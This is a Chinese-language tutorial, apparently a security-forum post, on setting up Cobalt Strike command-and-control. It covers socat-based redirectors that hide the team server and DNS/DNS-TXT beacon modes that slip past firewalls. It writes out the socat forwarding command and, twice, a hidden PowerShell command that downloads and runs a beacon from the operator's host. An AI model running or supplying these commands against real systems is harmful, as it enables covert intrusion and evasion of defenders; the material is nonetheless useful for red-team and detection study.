Cobalt Strike重定器与DNS beacon的使用原理分析
==================================

前言
--

Cobaltstrike在渗透中可以说是神器，而我们需要掌握它的技术也是要花一定时间的，下面主要介绍重定器、DNS beacon的使用，也是cobaltstrike中相对更难操作的部分。

Cobalt Strike使用重定器
------------------

### 重定器简介

“重定器”是一个在“cobalt strike”服务器和目标网络之间的服务器。这个“重定器”的作用是对你团队服务器下的连接，进行任意的连接或返回。（注：即通常说的代理服务器或端口转发工具）“重定器”服务（在攻击和防御中）是很重要的角色。

### Socat简介

工具socat （一款端口重定向工具） 我们用它来建立80端口上的连接管理，并且继续在80端口运行那个连接团队服务器的连接。socat是一个两个独立数据通道之间的双向数据传输的继电器, socat的主要特点就是在两个数据流之间建立通道；且支持众多协议和链接方式:ip,tcp,udp,ipv6,pipe,exec,system,open,proxy,openssl,socket等。

### 使用重定器的作用

1.保护服务器地址，并作为攻击者，它也是一个很好的安全操作。  
2.给予了一些很好的适应能力 假如你们的工具中有一两个堵塞了没有大不了的，也可以进行通信。

### 操作演示

**拓扑图**  
由于电脑性能问题，所以将r3也写入到192.168.0.156主机中  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-715914cfc15cf4f08ceccc4c1d2878faaf546df7.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-715914cfc15cf4f08ceccc4c1d2878faaf546df7.png)  
当目标网络访问teamserver时，需要经过r1.team.com、r2.teamcom、r3.team.com中任意一台主机充当中介进行访问，同时三台主机中任意一台出现故障，又可以通过其他两台主机进行通信，可以很好的防止单点故障问题。  
**dns信息图**  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-079f9b7bdb6ba0489f19fd74ab45dc6e18a66b25.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-079f9b7bdb6ba0489f19fd74ab45dc6e18a66b25.png)  
在每个重定向的Ubuntu上用socat进行转发  
`socat TCP4-LISTEN:80,fork TCP4:t.team.com:80`  
当运行出现以下问题时说明80端口被占用，需要关闭apache服务或者相关进程  
socat\[3191\] E bind(5, {AF=2 0.0.0.0:80}, 16): Address already in use  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-a94c73f5d8902ce2cad9aed30f52abc76852e1b8.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-a94c73f5d8902ce2cad9aed30f52abc76852e1b8.png)  
查看使用80端口的进程  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-dd0d1d082d93d88215e3a9e9bdc0dda47df55c56.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-dd0d1d082d93d88215e3a9e9bdc0dda47df55c56.png)  
关闭进程  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-0c5286bdbd65522160c1f04cd65c00e2b4bea500.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-0c5286bdbd65522160c1f04cd65c00e2b4bea500.png)  
成功使用socat转发  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d9f32a2e89ba2ee0196e87eeff8d24bd470b447e.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d9f32a2e89ba2ee0196e87eeff8d24bd470b447e.png)  
**判断重定向是否正常**  
打开cobalt strike web日志 浏览器访问以下网址  
<http://r1.team.com/r1>  
<http://r2.team.com/r2>  
<http://r3.team.com/r3>  
日志信息正确  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-782aeaf60d40cac7909feb8bf617f85b44b3118f.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-782aeaf60d40cac7909feb8bf617f85b44b3118f.png)  
**接下来创建powershell**   
设置监听器  
此时的主机可以是r1,r2,r3，因为r1也会将信息转发到teamserver中，监听的端口为80  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b0058595ebdc118fa865688d8fac29a0d51a8564.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b0058595ebdc118fa865688d8fac29a0d51a8564.png)  
填写两个域名 分别是r2.team.com,r3.team.com 当其中一个断开或者堵塞的时候会自动访问另外一个。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-a845ee5193d571e9a93766ab4e4dc764f5005b41.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-a845ee5193d571e9a93766ab4e4dc764f5005b41.png)  
创建脚本web传递攻击  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-cbc615d3245fa178a5c8348848a60e7e965eecfa.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-cbc615d3245fa178a5c8348848a60e7e965eecfa.png)

在目标上运行指令 目标上线  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-bca3b54c675d1b9def324bcb5948c1a301270fe1.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-bca3b54c675d1b9def324bcb5948c1a301270fe1.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c0020b01540f8cd2e17b1d206ca8746ef5a25fa9.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c0020b01540f8cd2e17b1d206ca8746ef5a25fa9.png)  
**抓包分析**  
通过wireshark抓包可以看到被控制端首先通过r2.team.com与r3.team.com与服务器建立连接，可以很好的防止溯源  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d1bfe24295f4d8e8df0d4f2c817273199ab798bb.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d1bfe24295f4d8e8df0d4f2c817273199ab798bb.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-8c72de4018f4520c0e055900e9ffcef904b2b442.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-8c72de4018f4520c0e055900e9ffcef904b2b442.png)

Cobalt Strike DNS Beacon的使用与原理
------------------------------

### dns木马

dns beacon的工作过程  
dns木马因为隐蔽性好，在受害者不会开放任何端口 可以规避防火墙协议，走的是53端口 (服务器)，防火墙不会拦截，缺点响应慢。

### dns beacon的工作过程

在 dns beacon使用dns隧道的过程  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-9a661317211895e55b94c87042efcaa107c06d97.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-9a661317211895e55b94c87042efcaa107c06d97.png)  
受害者在执行我们的传输器下载完木马之后就会发出a记录的请求，受害者首先会请求本地的hosts文件 ，再去请求本地的dns 能不能告诉123456.test.1377day.com 的ip多少，问com的dns 没有就会去查找dnspot的dns 如果都不存在 就会去查找名如果本地dns存在记录就返回ip，没有就会去查找root 根dns 不存在记录， 接着就会查找名称服务器。 在teasmserver的服务器上也有dns 刚好存在记录 就会返回ip 同时teasmserver 会有dns beacon的信息 返回受害者 受害者再请求危险的a记录到teamserver。 这就是dns beacon的工作过程。

### DNS beacon的类型

**windows/beacon\_dns/reserve\_http （传输数据小）**  
有效载荷通过HTTP连接分阶段。当您创建此侦听器时，请注意您正在配置主机和端口Cobalt Strike将使用通过HTTP分阶段此有效负载。当您选择设置此有效负载时，Cobalt Strike在端口53上站起来的DNS服务器。  
**beacon\_dns/reserve\_http（支持命令切换到该模式：mode dns）**  
将http通信方式，改为了使用dns的a记录方式进行通信。速度较慢，但非常隐蔽，推荐使用！  
**beacon\_dns/reserve\_dns\_txt（支持命令切换到该模式：mode dns-txt）**  
同上，只是改为使用dns的txt方式进行通信，传输的数据量更大，推荐使用！  
**windows/beacon\_dns/reverse\_dns\_txt （传输数据大）**  
有效负载使用DNS TXT记录下载和分级混合HTTP和DNS beacon。当您创建此侦听器时，请注意，您正在配置该有效负载将用于HTTP通信的端口。再次，Cobalt Strike知道在53端口站起来一个DNS服务器。  
以上都是非持续性的工作。

### 域名创建ns指向

如果没有域名，可以使用申请Freenom免费域名，并使用DNSPod解析  
请参考：<https://www.cnblogs.com/ssooking/p/6364639.html>  
首先创建a记录test.1377day.com 指向 teamserver  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-5b2fea71532fd81c7d1336badc62fcf3a17c3ec8.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-5b2fea71532fd81c7d1336badc62fcf3a17c3ec8.png)  
新建监听器  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-5a38224584f14ce24b111834de419d52276df9c7.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-5a38224584f14ce24b111834de419d52276df9c7.png)  
然后填写我们的NS记录  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-94cd384f76cba9b39dbd734d988e694c5a8a17ce.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-94cd384f76cba9b39dbd734d988e694c5a8a17ce.png)  
查看设置的记录是否成功  
123456(这个是任意的)  
nslookup 123456.c1.1377day.com，以下说明成功指向teamserver，说明记录设置成功  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-f64e1f1284fbb80b9fecf09a47f751f64a6c388c.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-f64e1f1284fbb80b9fecf09a47f751f64a6c388c.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-21e0e03aee32eb84be0390dec0e3a3522358dee5.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-21e0e03aee32eb84be0390dec0e3a3522358dee5.png)  
此时可知a记录成功指向teamserver  
dig +trace 123456.c1.1377day.com  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-78488bf380acf119c07dee722925b960f57c0fab.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-78488bf380acf119c07dee722925b960f57c0fab.png)

### DNS传输模式

创建脚本web传递攻击  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-471ed4155c252ce4b6a378a12f670e33bbd5d69b.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-471ed4155c252ce4b6a378a12f670e33bbd5d69b.png)  
在被控制端执行该命令  
`powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://test.1377day.com:80/a'))"`  
成功上线后，使用wireshark抓包分析，可以清楚的观察到47975.c3.1377day.com的记录，说明使用了dns传输模式  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-aefaaa95f48c7122a1b0d89bb56d46a233474861.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-aefaaa95f48c7122a1b0d89bb56d46a233474861.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-3efb8ee69feb3cb258ebdd3054d99bea22e6cfa1.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-3efb8ee69feb3cb258ebdd3054d99bea22e6cfa1.png)

### dns-txt传输模式

创建脚本web传递攻击  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-7f9ce0af5ad4d8ba49398096d0504c75f5022f17.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-7f9ce0af5ad4d8ba49398096d0504c75f5022f17.png)  
在被控制端执行该命令  
`powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://test.1377day.com:80/dns'))"`  
成功上线后，使用wireshark抓包分析，可以清楚的观察到使用了dns-txt传输模式  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-dc68a6aeeebd3a199b19e0a5ee47f170c9d43fbf.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-dc68a6aeeebd3a199b19e0a5ee47f170c9d43fbf.png)